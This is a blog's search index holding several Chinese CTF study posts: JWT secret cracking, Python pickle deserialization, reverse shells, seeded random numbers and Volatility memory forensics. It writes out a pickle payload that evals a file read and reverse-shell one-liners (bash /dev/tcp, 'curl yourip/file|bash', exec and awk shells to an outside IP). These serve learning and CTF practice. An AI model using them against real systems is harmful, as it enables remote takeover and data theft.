<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jwtcrack(kali)</title>
      <link href="/2023/11/30/jwtcrack/"/>
      <url>/2023/11/30/jwtcrack/</url>
      
        <content type="html"><![CDATA[<h1 id="jwtcrack"><a href="#jwtcrack" class="headerlink" title="jwtcrack"></a>jwtcrack</h1><p>此工具对于python用户登录时构造的用户信息jwt加密有爆破密码的作用。</p><h2 id="安装jwtcrack"><a href="#安装jwtcrack" class="headerlink" title="安装jwtcrack"></a>安装jwtcrack</h2><p>使用以下命令直接从github上下载下来源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker</span><br></pre></td></tr></table></figure><p>再安装gcc编译环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install make</span><br></pre></td></tr></table></figure><p>工具源码文件夹在任意位置即可(如桌面)<br>打开终端浸入文件夹内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c-jwt-cracker</span><br></pre></td></tr></table></figure><p>输入命令make<br>如出现报错则安装该头文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>再次运行make，编译成功。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack 字符串</span><br></pre></td></tr></table></figure><p>等待即可</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化</title>
      <link href="/2023/11/15/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/15/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>python的序列化和反序列化基本与php反序列化大致相同，但是python反序列化中，可以比较自由的创建新的属性和命令来调用<br>例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class tmp():</span><br><span class="line">text = <span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">text = tmp()</span><br><span class="line">sertext = pickle.dumps(text)</span><br><span class="line"><span class="built_in">print</span>(sertext)</span><br><span class="line">reltext = pickle.loads(sertext)</span><br><span class="line"><span class="built_in">print</span>(reltext)</span><br></pre></td></tr></table></figure><p>添加一些函数和变量后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class tmp():</span><br><span class="line">text = <span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">def __init__(self, text):</span><br><span class="line">self.text = text</span><br><span class="line"></span><br><span class="line">def __reduce__(self):</span><br><span class="line"><span class="built_in">return</span> (tmp,(<span class="string">&quot;helloworld&quot;</span>,))</span><br><span class="line"></span><br><span class="line">text = tmp(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">sertext = pickle.dumps(text)</span><br><span class="line"><span class="built_in">print</span>(sertext)</span><br><span class="line"></span><br><span class="line">reltext = pickle.loads(sertext)</span><br><span class="line"><span class="built_in">print</span>(reltext.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后可以看到，我们自己添加的hello world出现在了序列化字符串中。<br>具体解释可以看这位<a href="https://www.cnblogs.com/sijidou/p/16305695.html">sijidou的博客</a>。<br>在上述两个函数中，pickle.dumps，pickle.loads分别对应序列化和反序列化。</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这道题内包含JWT，这个东西类似与session识别用户信息，用于登录，伪造在在线网站给予密钥就可以伪造。<br>主要还是认识python反序列化，在最后一步中，获得了程序源码，找到python代码漏洞<br>其中直接利用点为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">become=self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">p=pickle.loads(urllib.unquote(become))</span><br><span class="line">retrun self.render(<span class="string">&#x27;form.html&#x27;</span>,res=p,member=1)</span><br></pre></td></tr></table></figure><p>构造序列化payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       <span class="built_in">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)<span class="comment">#对应urllib.unquote，也就是url编码</span></span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于python3中urllib库内urllib.quote(a)并不能使用，更换类似函数也无法使其执行命令<br>所以还是建议用python2运行得到url编码后的序列化字符串。</p><h2 id="Python-序列化与反序列化的其他函数"><a href="#Python-序列化与反序列化的其他函数" class="headerlink" title="Python 序列化与反序列化的其他函数"></a>Python 序列化与反序列化的其他函数</h2><p>python的序列化和反序列化一般通过pickle模块进行（也有json、messagepack等多种方式，但CTF常用pickle），序列化和反序列化的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">序列化</span><br><span class="line">pickle.dump()或pickle.dumps()</span><br><span class="line">Pickler().dump()</span><br><span class="line">反序列化</span><br><span class="line">pickle.load()或pickle.loads()</span><br><span class="line">Unpickler(file).load()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2023/11/10/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2023/11/10/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>目的还是记录一下在做题过程中，反弹shell失败的原因。<br>当一个服务器弹不出来的时候，应该多试几个服务器。<br>(咱也不知道是那个服务器的问题还是咱的操作问题，开web服务居然只能开80)<br>所以推荐还是多几个不同厂商的服务器比较好</p><h2 id="html反弹shell"><a href="#html反弹shell" class="headerlink" title="html反弹shell"></a>html反弹shell</h2><p>通过给目标靶机传入一个1.html的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/yourip/port 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p>为什么内容会多一个bash -c<br>因为在某些服务器中，他容易重定向模糊，导致反弹shell失败。<br>使用这个可以解决此类问题</p><h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p>这种反弹shell的条件是最少的，也是最简单的，同时也是最少见的。(你都拿到命令控制界面的显示框了，还弹shell干啥)或许是往里面写文件呢。<br>开始正题<br>在自己服务器开启监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br><span class="line">nc -lvp port</span><br><span class="line">两个命令都可，一个不行换另一个</span><br></pre></td></tr></table></figure><p>被攻击者服务器bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/yourip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>本质上适合html一样<br>无非是利用被攻击者服务器curl命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl yourip/file|bash</span><br></pre></td></tr></table></figure><p>使被攻击者的服务器主动访问你的文件并且执行内部bash命令<br>从而达到反弹shell的目的</p><h2 id="Exec反弹shell"><a href="#Exec反弹shell" class="headerlink" title="Exec反弹shell"></a>Exec反弹shell</h2><p>被攻击者服务器执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.123.192/19111;<span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>攻击者服务器执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br><span class="line">nc -lvp port</span><br><span class="line">开启端口</span><br></pre></td></tr></table></figure><h2 id="Awk反弹shell"><a href="#Awk反弹shell" class="headerlink" title="Awk反弹shell"></a>Awk反弹shell</h2><p>和上面的Exec反弹shell差不多<br>无非是受害者命令变了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/192.168.123.192/19111&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure><p>正常的bash反弹shell服务端结束了shell（ctrl+c取消），shell客户端（受害者）也随之结束建立连接的命令，但是awk再次监听端口时仍旧能连接（也就是客户端一直保持连接状态除非手动在客户端结束，这样的好处是即使服务端断开连接不用在受害者主机中再次执行命令直接nc接shell即可）</p><p>—后续更新ing</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪随机数</title>
      <link href="/2023/10/26/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
      <url>/2023/10/26/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="C关于seed"><a href="#C关于seed" class="headerlink" title="C关于seed"></a>C关于seed</h1><p>已知seed，就可以得到通过seed获得的多个随机数。<br>脚本如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;time.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">    int a[1000]=&#123;0&#125;;</span><br><span class="line">    srand(0);//0为种子值</span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;=9;i++)&#123;</span><br><span class="line">        a[i]=rand()%255;//计算公式</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  \n&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Python关于seed"><a href="#Python关于seed" class="headerlink" title="Python关于seed"></a>Python关于seed</h1><p>初始化随机数生成器：random.seed(a&#x3D;None)</p><p>如果 a 被省略或为 None ，则使用当前系统时间<br>每给定一个seed，它会生成一个序列，如序列X: 0.1,3.2,1.5,9.7…<br>你每次random.random()只是按顺序取了一个X中的点<br>对于同一个seed，它产生的序列是固定的，所以随机化结果必然相同，而系统时间在不断变大，所以产生的序列必然不同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;不加seed语句时，默认是用random.seed()&quot;</span>) <span class="comment"># 即使用当前的系统时间为seed</span></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed=45&quot;</span>)</span><br><span class="line">random.seed(45) <span class="comment"># 指定seed为45</span></span><br><span class="line"><span class="built_in">print</span>(random.random())  <span class="comment"># 取seed=45产生序列的第一个元素</span></span><br><span class="line"><span class="built_in">print</span>(random.random())  <span class="comment"># 取seed=45产生序列的第二个元素</span></span><br><span class="line"><span class="built_in">print</span>(random.random())  <span class="comment"># 取seed=45产生序列的第三个元素</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nseed=45&quot;</span>)</span><br><span class="line">random.seed(45)</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nseed=当前系统时间&quot;</span>)</span><br><span class="line">random.seed()  <span class="comment"># 默认是当前系统时间</span></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nseed=当前系统时间&quot;</span>)</span><br><span class="line">random.seed()</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的结果:<br>不加seed语句时，默认是用random.seed()<br>0.20832862243131767<br>0.4210403813034972<br>0.4153058477463908<br>seed&#x3D;45<br>0.2718754143840908<br>0.48802820785090784<br>0.08187934237116656</p><p>seed&#x3D;45<br>0.2718754143840908<br>0.48802820785090784<br>0.08187934237116656</p><p>seed&#x3D;当前系统时间<br>0.9664157011016027<br>0.9963620166960119<br>0.00929090874812366</p><p>seed&#x3D;当前系统时间<br>0.1560896344276015<br>0.26724242598166137<br>0.5839125852630351</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Volatility</title>
      <link href="/2023/10/23/Volatility/"/>
      <url>/2023/10/23/Volatility/</url>
      
        <content type="html"><![CDATA[<h1 id="Volatility"><a href="#Volatility" class="headerlink" title="Volatility"></a>Volatility</h1><p><a href="https://www.volatilityfoundation.org/26">Volatility官网地址</a><br>里面有Windows版本和Linux版本，我用的是Windows。<br>所以讲的大部分是Windows下的命令。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">可以使用 -h 参数获取使用方法和插件介绍，列举几个常用到的命令</span><br><span class="line"></span><br><span class="line">imageinfo：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数</span><br><span class="line"></span><br><span class="line">pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</span><br><span class="line"></span><br><span class="line">pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">cmdscan：可用于查看终端记录</span><br><span class="line"></span><br><span class="line">notepad：查看当前展示的 notepad 文本（–profile=winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</span><br><span class="line"></span><br><span class="line">filescan：扫描所有的文件列表</span><br><span class="line"></span><br><span class="line">linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’</span><br><span class="line"></span><br><span class="line">dumpfiles：导出某一文件(指定虚拟地址)</span><br><span class="line"></span><br><span class="line">需要指定偏移量 -Q 和输出目录 -D</span><br><span class="line"></span><br><span class="line">memdump：提取出指定进程，常用foremost 来分离里面的文件</span><br><span class="line"></span><br><span class="line">需要指定进程-p [pid] 和输出目录 -D</span><br><span class="line"></span><br><span class="line">editbox：显示有关编辑控件（曾经编辑过的内容）的信息</span><br><span class="line"></span><br><span class="line">screenshot：保存基于GDI窗口的伪截屏</span><br><span class="line"></span><br><span class="line">clipboard：查看剪贴板信息</span><br><span class="line"></span><br><span class="line">iehistory：检索IE浏览器历史记录</span><br><span class="line"></span><br><span class="line">systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）</span><br><span class="line"></span><br><span class="line">hashdump：查看当前操作系统中的 password <span class="built_in">hash</span>，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</span><br><span class="line"></span><br><span class="line">mftparser：恢复被删除的文件</span><br><span class="line"></span><br><span class="line">svcscan：扫描 Windows 的服务</span><br><span class="line"></span><br><span class="line">connscan：查看网络连接</span><br><span class="line"></span><br><span class="line">envars：查看环境变量</span><br><span class="line"></span><br><span class="line">dlllist: 列出某一进程加载的所有dll文件</span><br><span class="line"></span><br><span class="line">hivelist: 列出所有的注册表项及其虚拟地址和物理地址</span><br><span class="line"></span><br><span class="line">timeliner: 将所有操作系统事件以时间线的方式展开</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看用户名密码信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>查看服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 svcscan</span><br></pre></td></tr></table></figure><p>查看浏览器历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><p>查看网络连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p>查看命令行操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure><p>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</span><br></pre></td></tr></table></figure><p>查看当前展示的notepad内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 notepad</span><br></pre></td></tr></table></figure><p>提取进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</span><br></pre></td></tr></table></figure><p>屏幕截图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</span><br></pre></td></tr></table></figure><p>查看注册表配置单元</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p>查看注册表键名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</span><br></pre></td></tr></table></figure><p>查看注册表键值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 printkey -K <span class="string">&quot;xxxxxxx&quot;</span></span><br></pre></td></tr></table></figure><p>查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure><p>最大程序提取信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 timeliner</span><br></pre></td></tr></table></figure><h2 id="Volatility使用"><a href="#Volatility使用" class="headerlink" title="Volatility使用"></a>Volatility使用</h2><p>以一道取证题为例<br>Q:admin密码是什么?<br>通过imageinfo获取系统信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f window.vmem imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2NELJ.png"><br>使用使用hashdump获取sam</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f window.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2N4E2.png"><br>可以通过john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f window.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2NYZj.png"><br>Q:ip和主机名是什么<br>通过netscan可以查询到地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f window.vmem --profile=Win7SP1x64 netscan <span class="built_in">tee</span> netscan.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2N84V.png"><br>主机名需要通过查询注册表，先用hivelist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f window.vmem --profile=Win7SP1x64 hivelist <span class="built_in">tee</span> hivelist.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2N84V.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f worldskills3.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a000024010 &gt; system.txt;<span class="built_in">cat</span> system.txt name</span><br></pre></td></tr></table></figure><p>通过hivedump查询对应键名volatility -f worldskills3.vmem –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a000024010 &gt; system.txt;cat system.txt|grep name，这个速度比较慢。（不知道什么原因，这个东西出来的很慢，所以用了别人的图片QAQ）<br><img src="https://i.imgs.ovh/2023/10/23/2NT0W.png"><br>如果知道键名的话，可以直接查询键值(这两段Windows不是太好实现)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f worldskills3.vmem --profile=Win7SP1x64 printkey -K <span class="string">&quot;ControlSet001\Control\ComputerName&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/23/2Nqtv.png"><br>Q:获取桌面上的 flag.txt<br>先用filescan扫描文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f worldskills3.vmem --profile=Win7SP1x64 filescan grep <span class="string">&quot;flag.txt&quot;</span></span><br></pre></td></tr></table></figure><p>接着使用dumpfiles爆破文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f worldskills3.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007f1b6c10 --dump-dir=./</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zsteg(图片隐写工具)</title>
      <link href="/2023/10/22/zsteg/"/>
      <url>/2023/10/22/zsteg/</url>
      
